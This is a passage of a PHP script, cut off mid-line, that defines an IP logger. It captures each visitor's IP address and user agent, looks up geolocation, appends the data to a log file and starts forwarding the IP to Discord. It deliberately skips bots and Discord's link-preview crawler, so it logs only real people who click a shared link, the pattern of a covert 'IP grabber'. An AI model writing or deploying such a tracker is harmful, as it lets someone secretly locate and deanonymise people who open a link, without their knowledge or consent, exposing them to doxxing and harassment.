<?php

require_once __DIR__ . "/Discord.php"; // Correct path to Discord.php

class IpLogger {
    public function write($filename, $timezone) {
        $ip = $_SERVER['REMOTE_ADDR'];
        $userAgent = $_SERVER['HTTP_USER_AGENT'];

        // Check if the user agent is a known bot or web crawler or Discord
        if ($this->isBot($userAgent) || $this->isDiscordUserAgent($userAgent)) {
            // Skip logging if it's a bot, web crawler, or Discord user agent
            return;
        }

        // Get IP geolocation data
        $geoData = $this->getIpGeoData($ip);

        if ($geoData === null) {
            // If we can't get geolocation data, log an error and return
            error_log("Failed to retrieve geolocation data for IP: $ip");
            return;
        }

        $timestamp = (new DateTime('now', new DateTimeZone($timezone)))->format('Y-m-d H:i:s');
        $logEntry = "$timestamp - IP: $ip - User Agent: $userAgent\n";

        if ($file = fopen($filename, 'a')) {
            fwrite($file, $logEntry);
            fclose($file);
        } else {
            error_log("Failed to open file for writing: $filename");
        }

        // Send data to Discord
        $discord = new Discord();
        $response = $discord->sendIpToDisco
